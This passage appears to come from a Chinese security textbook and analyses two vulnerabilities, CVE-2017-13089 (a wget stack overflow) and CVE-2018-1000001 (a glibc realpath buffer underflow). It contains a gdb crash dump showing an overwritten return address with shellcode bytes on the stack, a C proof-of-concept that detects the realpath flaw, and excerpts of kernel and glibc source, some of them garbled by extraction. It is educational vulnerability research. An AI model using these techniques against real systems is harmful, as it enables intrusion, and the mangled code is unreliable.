RDX: 0x200
RSI: 0x7fffffffcf40 --> 0xfffae98148c93148
RDI: 0x4
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffd178 --> 0x7fffffffcf40 --> 0xfffae98148c93148
RIP: 0x41f0ed (: ret)
R8 : 0x7fffffffcdb0 --> 0x383
R9 : 0x1
R10: 0x0
R11: 0x246
R12: 0x404ca0 (: xor ebp,ebp)
R13: 0x7fffffffdcb0 --> 0x2
R14: 0x0
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x41f0e2 : call 0x42a0f5 
0x41f0e7 : mov eax,0x1
0x41f0ec : leave
=> 0x41f0ed : ret
0x41f0ee : push rbp
0x41f0ef : mov rbp,rsp
0x41f0f2 : sub rsp,0x30
0x41f0f6 : mov QWORD PTR [rbp-0x28
],rdi
[------------------------------------stack----------------------
---------------]
0000| 0x7fffffffd178 --> 0x7fffffffcf40 --> 0xfffae98148c93148
0008| 0x7fffffffd180 --> 0xa300a ('\n0\n')
1565
7.1.4 CVE-2017-13089 wget skip_short_body 栈溢出漏洞
0016| 0x7fffffffd188 --> 0x0
0024| 0x7fffffffd190 --> 0x7fffffffdad4 --> 0x0
0032| 0x7fffffffd198 --> 0x7fffffffd780 --> 0x0
0040| 0x7fffffffd1a0 --> 0x6a9a00 --> 0x68acb0 ("http://localhos
t:6666/")
0048| 0x7fffffffd1a8 --> 0x6a9a00 --> 0x68acb0 ("http://localhos
t:6666/")
0056| 0x7fffffffd1b0 --> 0x0
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x000000000041f0ed in skip_short_body ()
gdb-peda$ x/20gx 0x7fffffffcf40
0x7fffffffcf40: 0xfffae98148c93148 0xffffef058d48ffff 
#include 
#include 
#include 
void main() {
//char *path;
struct {
char canary[16];
char buffer[80];
} buf;
memset(buf.canary, 47, 1); // put a '/' before the buffer
memset(buf.buffer, 48, sizeof(buf.buffer));
//path = getcwd(NULL, 0);
//puts(path);
chroot("/tmp");
//path = getcwd(NULL, 0);
//puts(path);
realpath("../../../../BBBB", buf.buffer);
if (!strcmp(buf.canary, "/BBBB")) {
puts("Vulnerable");
} else {
puts("Not vulnerable");
}
}
# gcc -g poc.c
# ./a.out
Vulnerable
执行 realpath() 前：
1569
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
gdb-peda$ x/g buf.canary
0x7fffffffe4d0: 0x000000000000002f
gdb-peda$ x/15gx 0x7fffffffe4d0
0x7fffffffe4d0: 0x000000000000002f 0x00000000000000c2 
char *getcwd(char *buf, size_t size);
它用于得到一个以 null 结尾的字符串，内容是当前进程的当前工作目录的绝对路
径。并以保存到参数 buf 中的形式返回。
首先从 Linux 内核方面来看，在 2.6.36 版本的 vfs: show unreachable paths in
getcwd and proc 这次提交，使得当目录不可到达时，会在返回的目录字符串前面
加上 (unreachable) ：
// fs/dcache.c
static int prepend_unreachable(char **buffer, int *buflen)
{
return prepend(buffer, buflen, "(unreachable)", 13);
}
static int prepend(char **buffer, int *buflen, const char *str,
int namelen)
{
*buflen -= namelen;
if (*buflen = 0)
* return buf;
* errno = -retval;
* return NULL;
* }
*/
SYSCALL_DEFINE2(getcwd, char __user *, buf, unsigned long, size)
{
int error;
struct path pwd, root;
char *page = __getname();
if (!page)
return -ENOMEM;
rcu_read_lock();
get_fs_root_and_pwd_rcu(current->fs, &root, &pwd);
error = -ENOENT;
if (!d_unlinked(pwd.dentry)) {
unsigned long len;
char *cwd = page + PATH_MAX;
int buflen = PATH_MAX;
prepend(&cwd, &buflen, "\0", 1);
error = prepend_path(&pwd, &root, &cwd, &buflen);
rcu_read_unlock();
if (error  0) {
error = prepend_unreachable(&cwd, &buflen); // 当路径
不可到达时，添加前缀
if (error)
1572
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
goto out;
}
error = -ERANGE;
len = PATH_MAX + page - cwd;
if (len <= size) {
error = len;
if (copy_to_user(buf, cwd, len))
error = -EFAULT;
}
} else {
rcu_read_unlock();
}
out:
__putname(page);
return error;
}
可以看到在引进了 unreachable 这种情况后，仅仅判断返回值大于零是不够的，它
并不能很好地区分开究竟是绝对路径还是不可到达路径。然而很可惜的是，glibc 就
是这样做的，它默认了返回的 buf 就是绝对地址。当然也是由于历史原因，在修订
getcwd 系统调用之前，glibc 中的 getcwd() 库函数就已经写好了，于是遗留
下了这个不匹配的问题。
从 glibc 方面来看，由于它仍然假设 getcwd 将返回绝对地址，所以在函数
realpath() 中，仅仅依靠 name[0] != '/' 就断定参数是一个相对路径，而
忽略了以 ( 开头的不可到达路径。
__realpath() 用于将 path 所指向的相对路径转换成绝对路径，其间会将所
有的符号链接展开并解析 /./ 、 /../ 和多余的 / 。然后存放到
resolved_path 指向的地址中，具体实现如下：
// stdlib/canonicalize.c
char *
__realpath (const char *name, char *resolved)
{
[...]
1573
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
if (name[0] != '/') // 判断是否为绝对路径
{
if (!__getcwd (rpath, path_max)) // 调用 getcwd() 函数
{
rpath[0] = '\0';
goto error;
}
dest = __rawmemchr (rpath, '\0');
}
else
{
rpath[0] = '/';
dest = rpath + 1;
}
for (start = end = name; *start; start = end) // 每次循环处理路径
中的一段
{